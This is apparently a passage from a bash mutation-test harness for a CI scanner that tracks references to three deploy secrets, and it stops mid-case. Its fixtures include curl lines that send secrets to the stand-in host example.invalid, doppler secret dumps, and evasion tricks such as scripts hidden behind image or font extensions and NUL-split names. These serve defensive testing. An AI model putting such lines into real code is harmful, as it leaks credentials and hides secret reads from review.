bl_set .github/workflows/canary-status.yml CF_ACCESS_CLIENT_ID 4 2027-03-31
knobs RF_REF=refs/remotes/origin/pre
printf 'landed' > "$D/landed"
green c43 "R14: the cap itself (2027-03-31) is accepted (introduction arm: no base to compare)" "introduction: the suite is absent at the base"
prep m43b
bl_set apps/web-platform/infra/variables.tf WEBHOOK_DEPLOY_SECRET 4 2026-11-30
landed_dir; mutant m43b T5 "R14: a sink row must carry expiry '-'" "a sink row needs expiry '-'"
prep c44
printf '# touched\n' >> "$D/fx/scripts/probe.sh"
knobs RF_TODAY=2026-11-30
landed_dir; green c44 "R14: today == expiry on a blocking PR that touches a row's file is green (the expiry day itself)" "T3w:"
prep c44a
knobs RF_TODAY=2026-11-09
printf 'landed' > "$D/landed"
green c44a "R14: 21 days before expiry is green with a T3w warning that names the remaining tier-a count" "expire within 21 days" "" "tier-a rows remain"
prep c44b
knobs RF_TODAY=2026-11-08
printf 'landed' > "$D/landed"
green c44b "R14: 22 days before expiry is green with no warning" "T3w: no tier-a row expires within 21 days"
prep m44
printf '# touched\n' >> "$D/fx/scripts/probe.sh"
knobs RF_TODAY=2026-12-01
landed_dir; mutant m44 T3 "R14: expiry + 1 day on a blocking PR that touches a row's file"

# ── R15 (F-D): the event table (all rows past expiry: today 2027-01-01) ───────────────────────────
prep c45
printf '# touched\n' >> "$D/fx/scripts/probe.sh"
knobs RF_TODAY=2027-01-01 RF_EVENT=push RF_EVENTREF=refs/heads/main
landed_dir; green c45 "R15: expired + push to main touching a row's file is green with T3m, and emits an ::error:: annotation" "T3m: $FX_TIER_A_ROWS tier-a rows are past expiry (non-blocking on main by ruling)" "" "::error::T3m"
prep c45b
knobs RF_TODAY=2027-01-01 RF_EVENT=schedule RF_EVENTREF=refs/heads/main
printf '# touched\n' >> "$D/fx/scripts/probe.sh"
landed_dir; green c45b "R15: expired + schedule is green with T3m" "T3m: $FX_TIER_A_ROWS tier-a rows are past expiry"
prep c45c
knobs RF_TODAY=2027-01-01 RF_EVENT=workflow_dispatch RF_EVENTREF=refs/heads/main
printf '# touched\n' >> "$D/fx/scripts/probe.sh"
landed_dir; green c45c "R15: expired + workflow_dispatch on main is green with T3m" "T3m: $FX_TIER_A_ROWS tier-a rows are past expiry"
prep c45d
knobs RF_TODAY=2027-01-01 RF_EVENT=merge_group RF_EVENTREF=refs/heads/gh-readonly-queue/main/pr-1
printf '# touched\n' >> "$D/fx/scripts/probe.sh"
landed_dir; green c45d "R15: expired + a merge-queue gate is green with T3m" "T3m: $FX_TIER_A_ROWS tier-a rows are past expiry"
prep c46
knobs RF_TODAY=2027-01-01 RF_EVENT=pull_request RF_EVENTREF=refs/pull/1/merge
printf 'unrelated\n' > "$D/fx/README.md"
landed_dir; green c46 "R15: expired + a PR that touches no row's file is green with T3w" "none of their files"
prep m46
knobs RF_TODAY=2027-01-01 RF_EVENT=pull_request RF_EVENTREF=refs/pull/1/merge
printf '# touched\n' >> "$D/fx/scripts/probe.sh"
landed_dir; mutant m46 T3 "R15: expired + a PR that touches a row's file is RED" "scripts/probe.sh"
prep m47
knobs RF_TODAY=2027-01-01 RF_EVENT=workflow_dispatch RF_EVENTREF=refs/heads/feat-x
printf '# touched\n' >> "$D/fx/scripts/probe.sh"
landed_dir; mutant m47 T3 "R15: expired + a dispatch on a non-main ref is blocking"
prep m47c
knobs RF_TODAY=2027-01-01
printf '# touched\n' >> "$D/fx/scripts/probe.sh"
landed_dir; mutant m47c T3 "R15: expired + no event at all (a local run) defaults to PR-like and blocks"
prep m47d
knobs RF_TODAY=2027-01-01 RF_EVENT=pull_request RF_EVENTREF=refs/pull/1/merge
adr_add 'an unrelated ADR sentence'
landed_dir; mutant m47d T3 "E5: expired + a PR that touches only ADR-241 is blocking (the ADR is a governed file)"
prep m47e
knobs RF_TODAY=2027-01-01 RF_EVENT=pull_request RF_EVENTREF=refs/pull/1/merge
printf '# a baseline comment\n' >> "$BL"
landed_dir; mutant m47e T3 "E5: expired + a PR that touches only the baseline is blocking (the baseline is a governed file)"
prep c47b
knobs RF_TODAY=2027-01-01 RF_EVENT=pull_request RF_EVENTREF=refs/pull/1/merge
mkdir -p "$D/fx/knowledge-base/project/plans"; printf 'a plan\n' > "$D/fx/knowledge-base/project/plans/some-plan.md"
landed_dir; green c47b "D6: expired + a PR that touches only a plan document is NOT governed (the plan leaves the touched set)" "none of their files"
prep m77
knobs RF_REF=refs/remotes/origin/pre RF_TODAY=2027-01-01 RF_EVENT=pull_request RF_EVENTREF=refs/pull/1/merge
printf 'landed' > "$D/landed"
mutant m77 T3 "E5: expired + a blocking event on the introduction arm (no base to diff) counts as touched"
prep c77
knobs RF_REF=refs/remotes/origin/pre RF_TODAY=2027-01-01 RF_EVENT=push RF_EVENTREF=refs/heads/main
printf 'landed' > "$D/landed"
green c77 "E5: the same introduction arm on a push to main is green with T3m" "T3m:"

# ── R16 (F-A3): the guard constants are pinned (stems, exempt class, binary extensions, code extensions) ───────
prep m50
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" "$ST_PIN_STEMS" "$ST_PIN_STEMS_DROP"
knobs RF_PY="$D/trio.py"
landed_dir; mutant m50 T6 "R16: a stem dropped from the scanner constant" "pin @stems: the baseline record"
prep m51
edit "$BL" "$HDR_STEMS" "$HDR_STEMS_DROP"
landed_dir; mutant m51 T6 "R16: a stem dropped from the baseline header" "pin @stems: the baseline record"
prep m52
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" "$ST_PIN_STEMS" "$ST_PIN_STEMS_DROP"
edit "$BL" "$HDR_STEMS" "$HDR_STEMS_DROP"
bl_del .github/workflows/cutover-inngest.yml CF_ACCESS_CLIENT_SECRET
knobs RF_PY="$D/trio.py"
commit_all; landed_dir; mutant m52 T6 "R16: constant, header AND the dropped stem's rows removed together still differ from the base copy" "differs from the base copy's"
prep m69
mkdir -p "$D/fx/bin"; printf '#!/usr/bin/env bash\ndoppler secrets download --no-file --format json | jq -r .WEBHOOK_DEPLOY_SECRET\n' > "$D/fx/bin/new.sh"
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" 'EXEMPT_DIRS = {"test", "tests", "__tests__", "fixtures"}' 'EXEMPT_DIRS = {"test", "tests", "__tests__", "fixtures", "bin"}'
knobs RF_PY="$D/trio.py"
landed_dir; mutant m69 T6 "C3: the exempt class widened in the scanner constant (a new trio-reading script sits in the newly exempt bin/)" "pin @exempt: the baseline record"
prep m69b
edit "$BL" '@exempt __tests__,fixtures,test,tests;' '@exempt __tests__,test,tests;'
landed_dir; mutant m69b T6 "C3: the exempt class edited in the baseline header" "pin @exempt: the baseline record"
prep m69c
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" 'EXEMPT_DIRS = {"test", "tests", "__tests__", "fixtures"}' 'EXEMPT_DIRS = {"test", "tests", "__tests__", "fixtures", "bin"}'
edit "$BL" '@exempt __tests__,fixtures,test,tests;' '@exempt __tests__,bin,fixtures,test,tests;'
knobs RF_PY="$D/trio.py"
commit_all; landed_dir; mutant m69c T6 "C3: constant and header widened together still differ from the base copy" "differs from the base copy's"
prep m69d
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" 'BINARY_EXT = {"png",' 'BINARY_EXT = {"sh", "png",'
knobs RF_PY="$D/trio.py"
landed_dir; mutant m69d T6 "C3: .sh added to the binary-extension constant (every script would vanish from the scan)" "pin @binary: the baseline record"
prep m69e
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" 'KB_CODE_EXT = {"sh", "bash",' 'KB_CODE_EXT = {"bash",'
knobs RF_PY="$D/trio.py"
landed_dir; mutant m69e T6 "C3: .sh dropped from the code extensions scanned under knowledge-base/ and docs/" "pin @kbcode: the baseline record"

# ── R17 (F-A1): an unreadable scanned file (a gitlink: listed by ls-files, open() raises even as root) ────────────
prep m53
mkdir -p "$D/fx/scripts/gitlink.sh"
gc -C "$D/fx" update-index --add --cacheinfo "160000,$FXHEAD,scripts/gitlink.sh"
landed_dir; mutant m53 T8 "R17: a scanned entry that cannot be read (a gitlink directory; root-proof)" "scripts/gitlink.sh (IsADirectoryError)"
prep c53
rm -f "$D/fx/apps/web-platform/server/clean.ts"
landed_dir; green c53 "R17: a cached file that is merely gone from the worktree is skipped silently"
prep m62
printf '#!/usr/bin/env bash\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$D/fx/scripts/payload.png"
landed_dir; mutant m62 T8 "B1: a script hidden behind a binary extension (.png) that names the trio is a hard FAIL" "scripts/payload.png (binary extension, but it names the trio)"
prep m62b
printf 'run: echo "$CF_ACCESS_CLIENT_SECRET"\n' > "$D/fx/plugins/soleur/skills/ship/payload.woff2"
landed_dir; mutant m62b T8 "B1: the same behind .woff2 (second binary extension)" "plugins/soleur/skills/ship/payload.woff2 (binary extension, but it names the trio)"

# ── R18 (F-C): the Tier-B environment proof, against a FIXTURE environment set ────────────────────
prep m54
knobs RF_ENVS=infra-privileged
printf 'landed' > "$D/landed"
mutant m54 T5c "R18: deploy-channel removed from the fixture environment set: the jobs naming the trio are no longer Tier-B" "deploy-chan.yml WEBHOOK_DEPLOY_SECRET (baseline tier-b, computed tier-a)"
prep m54b
edit "$D/fx/.github/workflows/deploy-chan2.yml" "        environment: 'infra-privileged'" "        timeout-minutes: 5"
landed_dir; mutant m54b T5c "R18: one of two jobs naming the trio loses its environment: the file is no longer tier-b" "deploy-chan2.yml CF_ACCESS_CLIENT_ID (baseline tier-b, computed tier-a)"
prep m54c
edit "$D/fx/.github/workflows/deploy-chan.yml" 'curl -H "X-Sig: $WEBHOOK_DEPLOY_SECRET" https://example.invalid' 'curl -H "X-Sig: ${{ secrets.WEBHOOK_DEPLOY_SECRET }}" https://example.invalid'
landed_dir; mutant m54c T5c 'R18: a ${{ secrets.X }} read inside a Tier-B-environment job is still a direct-store read shape (tier-a)' "deploy-chan.yml WEBHOOK_DEPLOY_SECRET (baseline tier-b, computed tier-a)"
prep m54e
edit "$D/fx/.github/workflows/deploy-chan.yml" 'curl -H "X-Sig: $WEBHOOK_DEPLOY_SECRET" https://example.invalid' 'doppler secrets get WEBHOOK_DEPLOY_SECRET -c prd_terraform --plain'
landed_dir; mutant m54e T5c "R18: a doppler secrets get on prd_terraform inside a Tier-B-environment job is tier-a whatever the environment" "deploy-chan.yml WEBHOOK_DEPLOY_SECRET (baseline tier-b, computed tier-a)"
prep m54f
edit "$D/fx/.github/workflows/deploy-chan.yml" 'curl -H "X-Sig: $WEBHOOK_DEPLOY_SECRET" https://example.invalid' 'doppler run -- ./deploy.sh "$WEBHOOK_DEPLOY_SECRET"'
landed_dir; mutant m54f T5c "B3: a doppler run of any config inside a Tier-B-environment job is tier-a" "deploy-chan.yml WEBHOOK_DEPLOY_SECRET (baseline tier-b, computed tier-a)"
prep c54
knobs RF_ENVS= RF_SIB="$ROOT/$SIBLING_REL"
printf 'landed' > "$D/landed"
green c54 "E1: with the environment set single-sourced from the sibling census (plus the pending deploy-channel) the fixture is all green" "E1: the Tier-B environment set is single-sourced from"
prep m54d
cp "$T/trio.py" "$D/trio.py"
edit "$D/trio.py" 'PENDING_ENVS = {"deploy-channel", "inngest-cutover"}' 'PENDING_ENVS = {"deploy-channel", "inngest-cutover", "not-a-real-environment"}'
knobs RF_PY="$D/trio.py" RF_ENVS= RF_SIB="$ROOT/$SIBLING_REL"
landed_dir; mutant m54d E1 "R18: a pending environment name the sibling census does not hold is not accepted" "not-a-real-environment"

# ── C1/C2 (round 2): composite actions are tier-a; the environment proof's could-not-measure branches ───────────────
prep m68
mkdir -p "$D/fx/.github/actions/z"
printf 'name: z\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo "$CF_ACCESS_CLIENT_SECRET"\n' > "$D/fx/.github/actions/z/action.yaml"
landed_dir; mutant m68 T1 "C1: a composite action (action.yaml spelling) naming the trio with no row" ".github/actions/z/action.yaml CF_ACCESS_CLIENT_SECRET"
prep m68b
bl_set .github/actions/uses-trio/action.yml CF_ACCESS_CLIENT_ID 3 sink
bl_set .github/actions/uses-trio/action.yml CF_ACCESS_CLIENT_ID 4 -
landed_dir; mutant m68b T5c "C1: a composite action recorded as a permanent sink (it has no job to prove an environment)" ".github/actions/uses-trio/action.yml CF_ACCESS_CLIENT_ID (baseline sink, computed tier-a)"
prep m68c
bl_set .github/actions/uses-trio/action.yml CF_ACCESS_CLIENT_ID 3 tier-b
bl_set .github/actions/uses-trio/action.yml CF_ACCESS_CLIENT_ID 4 -
landed_dir; mutant m68c T5c "C1: a composite action recorded as tier-b" ".github/actions/uses-trio/action.yml CF_ACCESS_CLIENT_ID (baseline tier-b, computed tier-a)"

# ── B1/B2: a NUL never hides a file; the doc prefixes hide only non-code ─────────────────────────────
prep m61
{ printf '#!/usr/bin/env bash\necho start\n#%0100d\n' 0; printf '\0\n'; printf 'doppler secrets get WEBHOOK_DEPLOY_SECRET --plain\n'; } > "$D/fx/scripts/nul1.sh"
landed_dir; mutant m61 T1 "B1: a .sh with a NUL after byte 80 and a doppler read of the trio after it (bash runs it)" "scripts/nul1.sh WEBHOOK_DEPLOY_SECRET"
prep m61b
{ printf '\0\n'; printf 'echo "$CF_ACCESS_CLIENT_ID"\n'; } > "$D/fx/scripts/nul2.sh"
landed_dir; mutant m61b T1 "B1: a NUL on the first line, the name on the second" "scripts/nul2.sh CF_ACCESS_CLIENT_ID"
prep m61c
printf 'echo "$WEBHOOK_\0DEPLOY_SECRET"\n' > "$D/fx/scripts/nul3.sh"
landed_dir; mutant m61c T1 "B1: a name split by a NUL (read once with the NULs removed, as bash reads it)" "scripts/nul3.sh WEBHOOK_DEPLOY_SECRET"
prep m63
printf '#!/usr/bin/env bash\ndoppler secrets get WEBHOOK_DEPLOY_SECRET --plain -c prd_terraform\n' > "$D/fx/docs/pull.sh"
landed_dir; mutant m63 T1 "B2: a script under docs/ is code and is scanned" "docs/pull.sh WEBHOOK_DEPLOY_SECRET"
prep m63b
printf 'run: doppler secrets get CF_ACCESS_CLIENT_ID --plain\n' > "$D/fx/knowledge-base/project/pull.yaml"
landed_dir; mutant m63b T1 "B2: a .yaml under knowledge-base/ is code and is scanned" "$KBN/project/pull.yaml CF_ACCESS_CLIENT_ID"
prep m63c
printf '{"env": "CF_ACCESS_CLIENT_SECRET"}\n' > "$D/fx/knowledge-base/project/cfg.json"
landed_dir; mutant m63c T1 "B2: a .json under knowledge-base/ is scanned (third code extension)" "$KBN/project/cfg.json CF_ACCESS_CLIENT_SECRET"

# ── B3: read shapes outside the adjacency form, in the exempt class ───────────────────────────────
prep m64
mkdir -p "$D/fx/tests/scripts/lib"; printf '#!/usr/bin/env bash\ndoppler secrets download --no-file --format json -p soleur -c prd_terraform | jq -r .WEBHOOK_DEPLOY_SECRET\n' > "$D/fx/tests/scripts/lib/x.sh"
landed_dir; mutant m64 T1 "B3: doppler secrets download | jq .NAME in a production-sourced lib under an exempt tests/ directory" "tests/scripts/lib/x.sh WEBHOOK_DEPLOY_SECRET"
prep m64b
mkdir -p "$D/fx/tests/scripts/lib"; printf '#!/usr/bin/env bash\ndoppler run -p soleur -c "prd_""terraform" -- true\necho CF_ACCESS_CLIENT_ID\n' > "$D/fx/tests/scripts/lib/y.sh"
landed_dir; mutant m64b T1 "B3: a split prd_ + terraform literal in an exempt lib" "tests/scripts/lib/y.sh CF_ACCESS_CLIENT_ID"
prep m64c
mkdir -p "$D/fx/tests/scripts/lib"; printf '#!/usr/bin/env bash\nV=CF_ACCESS_CLIENT_SECRET\ndoppler secrets get "$V" --plain\n' > "$D/fx/tests/scripts/lib/z.sh"
landed_dir; mutant m64c T1 "B3: doppler secrets get with a variable name in an exempt lib" "tests/scripts/lib/z.sh CF_ACCESS_CLIENT_SECRET"
prep m64d
mkdir -p "$D/fx/tests/scripts/lib"; printf '#!/usr/bin/env bash\nn=WEBHOOK_DEPLOY_SECRET; echo "${!n}"\n' > "$D/fx/tests/scripts/lib/w.sh"
landed_dir; mutant m64d T1 "B3: a \${!var} indirection of a family name in an exempt lib" "tests/scripts/lib/w.sh WEBHOOK_DEPLOY_SECRET"
prep m64e
mkdir -p "$D/fx/tests/scripts/lib"; printf '#!/usr/bin/env bash\nterraform output -raw access_service_token_client_secret\n' > "$D/fx/tests/scripts/lib/v.sh"
landed_dir; mutant m64e T1 "B3: terraform output -raw access_service_token_client_secret in an exempt lib" "tests/scripts/lib/v.sh ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_SECRET"
prep m64f
printf '#!/usr/bin/env bash\nS="${{ secrets['"'"'CF_ACCESS_CLIENT_ID'"'"'] }}"\n' > "$D/fx/scripts/b.test.sh"
landed_dir; mutant m64f T1 "B3: the secrets['NAME'] bracket form in a .test.sh" "scripts/b.test.sh CF_ACCESS_CLIENT_ID"

# ── B4: the comment filter keeps every line that expands ───────────────────────────────────────────
prep m65
printf '#!/usr/bin/env bash\n//usr/bin/curl -H "X: $WEBHOOK_DEPLOY_SECRET" https://example.invalid\n' > "$D/fx/scripts/dbl.sh"
landed_dir; mutant m65 T1 "B4: a //usr/bin/curl line in a .sh runs (// is not a comment marker in shell)" "scripts/dbl.sh WEBHOOK_DEPLOY_SECRET"
prep m65b
printf '#!/usr/bin/env bash\ncat <<EOF2\n#${WEBHOOK_DEPLOY_SECRET}\nEOF2\n' > "$D/fx/scripts/heredoc.sh"
landed_dir; mutant m65b T1 "B4: a heredoc line #\${NAME} expands and is not a comment" "scripts/heredoc.sh WEBHOOK_DEPLOY_SECRET"
prep m65c
printf 'name: x\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: |\n          curl --data-binary @- https://example.invalid <<EOF2\n          #${{ secrets.WEBHOOK_DEPLOY_SECRET }}\n          EOF2\n' > "$D/fx/.github/workflows/hd.yml"
landed_dir; mutant m65c T1 "B4: a #\${{ secrets.X }} line inside a run: block expands before the shell sees it" ".github/workflows/hd.yml WEBHOOK_DEPLOY_SECRET"
prep m65d
printf 'class A {\n  #CF_ACCESS_CLIENT_ID = 1;\n}\n' > "$D/fx/apps/web-platform/server/priv.ts"
landed_dir; mutant m65d T1 "B4: a JS/TS private field #NAME is code, not a comment" "apps/web-platform/server/priv.ts CF_ACCESS_CLIENT_ID"
prep m65e
printf '// ${CF_ACCESS_CLIENT_ID} is interpolated\nexport const t = 1;\n' > "$D/fx/apps/web-platform/server/tpl.ts"
landed_dir; mutant m65e T1 "B4: a // line holding \${...} is kept even in TS" "apps/web-platform/server/tpl.ts CF_ACCESS_CLIENT_ID"

# ── B6: a line ending in || continues on the next line ────────────────────────────────────────────
prep m67
printf '#!/usr/bin/env bash\nx=$(doppler secrets get CF_ACCESS_CLIENT_ID --plain ||\n  doppler secrets get SOME_OTHER_CRED --plain)\n' > "$D/fx/scripts/fb.sh"
landed_dir; mutant m67 T1 "B6: a trailing || joins the next line, so the fallback credential is a FALLBACK key" "scripts/fb.sh FALLBACK:SOME_OTHER_CRED"
prep c67
printf 'x=$(doppler secrets get CF_ACCESS_CLIENT_ID --plain ||\n  echo none)\n' >> "$D/fx/scripts/probe.sh"
landed_dir; green c67 "B6: the same trailing || followed by a non-doppler command adds no FALLBACK key"

# ── Other must-stay-green fixtures and harness rows ───────────────────────────────────────────────
# (1) A must-PASS input that is NOT the canonical: different indentation, comment-only mentions, the family look-alikes.
prep c2
printf '        # CF_ACCESS_CLIENT_SECRET named only in a comment\n      - run: echo "a   trio:   WEBHOOK_DEPLOY_SECRET   is baselined"\n' >> "$D/fx/.github/workflows/web-platform-release.yml"
printf '#!/usr/bin/env bash\n# WEBHOOK_DEPLOY_SECRET named in a shell comment\nFOO_WEBHOOK_DEPLOY_SECRETX=1\nWEBHOOK_DEPLOY_SECRETX=2\nXCF_ACCESS_CLIENT_ID=3\nD_WEBHOOK_DEPLOY_SECRET=4\n' > "$D/fx/scripts/lookalike.sh"
printf 'The CF_ACCESS_CLIENT_ID is mentioned in a knowledge-base note.\n' > "$D/fx/knowledge-base/n.md"
landed_dir; green c2 "a comment-only mention, a re-indented baselined read, look-alike names (FOO_..._SECRETX, D_...) and a kb note stay green"
# (2) The name match is a WHOLE token: WEBHOOK_DEPLOY_SECRET_NEXT is its own name, not a hit on the base name.
prep c3
printf 'S: ${{ secrets.WEBHOOK_DEPLOY_SECRET_NEXT }}\n' > "$D/fx/scripts/nxt.sh"
landed_dir; run_in "$D"
if [ "$(row_state "$D/out" T1)" = "FAIL" ] && awk -F'\t' '$2 ~ /^T1:/ {n = split($3, a, "; "); for (i = 1; i <= n; i++) {if (a[i] == "scripts/nxt.sh WEBHOOK_DEPLOY_SECRET") bad = 1; if (a[i] == "scripts/nxt.sh WEBHOOK_DEPLOY_SECRET_NEXT") ok = 1}} END {exit !(ok && !bad)}' "$D/out"; then pass "C3: the rotation next-secret is its own name (the base-name pair is NOT reported for nxt.sh)"
else fail "C3: the rotation next-secret is its own name (the base-name pair is NOT reported for nxt.sh)" "$(head -c 300 "$D/out")"; fi
# (3) The comment filter is whole-line only: a trailing comment after a real read does not hide it (far side of C2).
prep m56
printf '#!/usr/bin/env bash\necho "$CF_ACCESS_CLIENT_SECRET" # why\n' > "$D/fx/scripts/trailing.sh"
landed_dir; mutant m56 T1 "a read followed by a trailing comment is still a read" "scripts/trailing.sh CF_ACCESS_CLIENT_SECRET"
# (3b) A file name carrying control characters is echoed sanitized (no ESC/CR reaches a log line)
prep m82
_esc_name="scripts/a$(printf '\033')[31mb$(printf '\r')c.sh"
printf '#!/usr/bin/env bash\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$D/fx/$_esc_name"
landed_dir; mutant m82 T1 "E6: a file name with ESC and CR naming the trio is reported with the control characters replaced" "scripts/a [31mb c.sh WEBHOOK_DEPLOY_SECRET"
# (4) The -M90% rename boundary, calibrated against git's own similarity score (E5)
prep cal
_k_ok=""; _k_low=""; _prev_score=""; _prev_k=""; _sc_ok=0; _sc_low=100
for _k in $(seq 0 40); do
  { printf '#!/usr/bin/env bash\necho "$WEBHOOK_DEPLOY_SECRET"\n'; for _i in $(seq 1 99); do
      if [ "$_i" -le "$_k" ]; then printf '# REWRITTEN: the slow red dog crawls under the busy brown hen number %03d\n' "$_i"; else printf '# filler line number %03d: the quick brown fox jumps over the lazy dog\n' "$_i"; fi
    done; } > "$D/fx/scripts/ren2.sh"
  rm -f "$D/fx/scripts/ren.sh"
  gc -C "$D/fx" add -A >/dev/null 2>&1
  _score="$(GITQ_ISO=1 GITQ -C "$D/fx" diff --cached -M1% --name-status -- scripts/ren.sh scripts/ren2.sh | awk '$1 ~ /^R/ {print substr($1, 2) + 0}')"
  _score="${_score:-0}"
  if [ "$_score" -lt 90 ]; then _k_low="$_k"; _k_ok="$_prev_k"; _sc_low="$_score"; _sc_ok="$_prev_score"; break; fi
  _prev_k="$_k"; _prev_score="$_score"
done
if [ -n "$_k_ok" ] && [ "$_sc_ok" -ge 90 ] && [ "$_sc_low" -lt 90 ] && [ "$((_k_low - _k_ok))" -eq 1 ]; then pass "C-cal: git pairs scripts/ren.sh with a copy edited in $_k_ok lines at $_sc_ok% and unpairs it at $_k_low lines ($_sc_low%): the -M90% boundary brackets exactly"
else fail "C-cal: the -M90% boundary is calibrated against git's similarity score" "k_ok=$_k_ok ($_sc_ok) k_low=$_k_low ($_sc_low)"; fi
_ren_file() { # <k> <path>  — ren.sh with its first k filler lines rewritten, at <path>
  { printf '#!/usr/bin/env bash\necho "$WEBHOOK_DEPLOY_SECRET"\n'; for _i in $(seq 1 99); do
      if [ "$_i" -le "$1" ]; then printf '# REWRITTEN: the slow red dog crawls under the busy brown hen number %03d\n' "$_i"; else printf '# filler line number %03d: the quick brown fox jumps over the lazy dog\n' "$_i"; fi
    done; } > "$2"
}
prep c75
rm -f "$D/fx/scripts/ren.sh"; _ren_file "${_k_ok:-0}" "$D/fx/scripts/ren2.sh"
bl_del scripts/ren.sh WEBHOOK_DEPLOY_SECRET
bl_add scripts/ren2.sh WEBHOOK_DEPLOY_SECRET sink - '#9294:PR-2'
commit_all; landed_dir; green c75 "E5: a rename at ${_sc_ok:-?}% similarity (>= 90%) carries its row"
prep c75b
rm -f "$D/fx/scripts/ren.sh"; _ren_file "$(( ${_k_ok:-1} > 0 ? ${_k_ok:-1} - 1 : 0 ))" "$D/fx/scripts/ren2.sh"
bl_del scripts/ren.sh WEBHOOK_DEPLOY_SECRET
bl_add scripts/ren2.sh WEBHOOK_DEPLOY_SECRET sink - '#9294:PR-2'
commit_all; landed_dir; green c75b "E5: a rename one edited line closer than the boundary (above ${_sc_ok:-?}%) carries its row"
prep m75
rm -f "$D/fx/scripts/ren.sh"; _ren_file "${_k_low:-99}" "$D/fx/scripts/ren2.sh"
bl_del scripts/ren.sh WEBHOOK_DEPLOY_SECRET
bl_add scripts/ren2.sh WEBHOOK_DEPLOY_SECRET sink - '#9294:PR-2'
commit_all; landed_dir; mutant m75 T4 "E5: the same rename at ${_sc_low:-?}% similarity (< 90%) is a new key, not a carried row" "has no @allow at the merge-base"

# ── T5 well-formedness sub-checks (each branch of the vocabulary) ────────────────────────────────
prep m78a
bl_add scripts/host-user.sh FOO_BAR sink - '#9294:PR-2'
landed_dir; mutant m78a T5 "T5: a row name outside the trio family" "name 'FOO_BAR' is not a trio-family"
prep m78b
printf 'scripts/host-user.sh\tWEBHOOK_DEPLOY_SECRET_X\tsink\t-\t\n' >> "$BL"
landed_dir; mutant m78b T5 "T5: a blank cell" "need 5 non-empty tab-separated columns"
prep m78c
bl_set .github/workflows/deploy-chan.yml WEBHOOK_DEPLOY_SECRET 3 tier-c
landed_dir; mutant m78c T5 "T5: a class outside the vocabulary" "is not tier-a|tier-b|sink"
prep m78d
bl_set scripts/probe.sh FALLBACK:CI_SSH_ACCESS_TOKEN_ID 3 sink
bl_set scripts/probe.sh FALLBACK:CI_SSH_ACCESS_TOKEN_ID 4 -
landed_dir; mutant m78d T5 "T5: a FALLBACK row that is not tier-a" "must be tier-a"
prep m78e
printf '%s\n' "$HDR_STEMS" >> "$BL"
landed_dir; mutant m78e T5 "T5: two @stems records" "expected exactly one @stems record, found 2"
prep m78f
printf '@allow\tscripts/x.sh\tFOO_NAME\t-\t#9294:PR-2\n' >> "$BL"
landed_dir; mutant m78f T5 "T5: an @allow whose name is outside the family" "@allow name 'FOO_NAME' is not a trio-family name"
prep m78g
printf '@allow\tapps/web-platform/infra/server.tf\tWEBHOOK_DEPLOY_SECRET_NEXT\t-\t#9294:PR-2\n' >> "$BL"
landed_dir; mutant m78g T5 "T5: a duplicate @allow" "duplicate @allow apps/web-platform/infra/server.tf WEBHOOK_DEPLOY_SECRET_NEXT"
prep m78i
printf '@allow\tscripts/x.sh\tCF_ACCESS_CLIENT_ID\t2026-13-45\t#9294:PR-2\n' >> "$BL"
landed_dir; mutant m78i T5 "T5: an @allow whose max-expiry is neither '-' nor a strict ISO date" "@allow max-expiry '2026-13-45' is not '-' or a strict ISO date"
prep m78j
printf '@allow\tscripts/x.sh\tCF_ACCESS_CLIENT_ID\t-\n' >> "$BL"
landed_dir; mutant m78j T5 "T5: an @allow with four fields instead of five" "@allow needs 5 non-empty tab-separated fields"
prep m78h
awk '!/^@exempt /' "$BL" > "$BL.new" && mv "$BL.new" "$BL"
landed_dir; mutant m78h T5 "T5: the @exempt record missing (a pinned constant with no record)" "expected exactly one @exempt record, found 0"

# ── D4: every git failure while resolving the base fails closed (a real PATH shim, not a function) ──────────
mkdir -p "$T/shim"
cat > "$T/shim/git" <<'SHIM'
#!/usr/bin/env bash
# fails (rc 128) any invocation whose argument string matches $SHIM_FAIL_RE; otherwise it is the real git
if [ -n "${SHIM_FAIL_RE:-}" ] && [[ " $* " =~ $SHIM_FAIL_RE ]]; then echo "shim: injected failure" >&2; exit 128; fi
exec "$SHIM_REAL_GIT" "$@"
SHIM
chmod +x "$T/shim/git"
shim_case() { # <id> <regex> <label wanted in the T4 detail>
  prep "$1"
  knobs "+PATH=$T/shim:$PATH" "+SHIM_REAL_GIT=$REAL_GIT" "+SHIM_FAIL_RE=$2"
  printf 'landed' > "$D/landed"
  mutant "$1" T4 "D4: the shim fails \`git $3\` while the base resolves (the ratchet must fail closed, not read an empty change list)" "git $3 failed" merge-base
}
shim_case m73a ' ls-tree .*tests/scripts/test-trio-baseline-census.sh' "ls-tree suite"
shim_case m73b ' ls-tree .*tests/scripts/trio-baseline.tsv' "ls-tree baseline"
shim_case m73c ' show ' "show baseline"
shim_case m73d ' diff .*--name-status ' "diff name-status"
shim_case m73e ' ls-files -z --others ' "ls-files others"
shim_case m73f ' diff .*--unified=0 ' "diff adr"
shim_case m73g ' log ' "log baseline"
shim_case m73h ' diff .* -- tests/scripts/trio-baseline.tsv ' "diff baseline"
shim_case m73i ' merge-base ' "merge-base"
shim_case m73j ' rev-parse --verify -q HEAD[^ ]*commit' "rev-parse HEAD"
prep c73
knobs "+PATH=$T/shim:$PATH" "+SHIM_REAL_GIT=$REAL_GIT" '+SHIM_FAIL_RE= no-such-subcommand '
printf 'landed' > "$D/landed"
green c73 "D4: the same shim with a regex that matches nothing is transparent (the failures above are the shim, not the harness)" "" merge-base

# ── D1: the documented regeneration (--emit-baseline) is ratchet-green after an @allow is spent ──────────────
prep c71
printf 'variable "webhook_deploy_secret_next" {}\n' >> "$D/fx/apps/web-platform/infra/variables.tf"
printf 'locals { n = var.webhook_deploy_secret_next }\n' >> "$D/fx/apps/web-platform/infra/server.tf"
printf 'runcmd:\n  - WEBHOOK_DEPLOY_SECRET_NEXT=x\n' > "$D/fx/apps/web-platform/infra/cloud-init.yml"
bl_regen
commit_all; landed_dir; green c71 "D1: after PR-1-style edits spend three @allow lines, the baseline REGENERATED by --emit-baseline (tags and a re-dated expiry preserved, spent allows dropped) passes the ratchet"
prep c71b
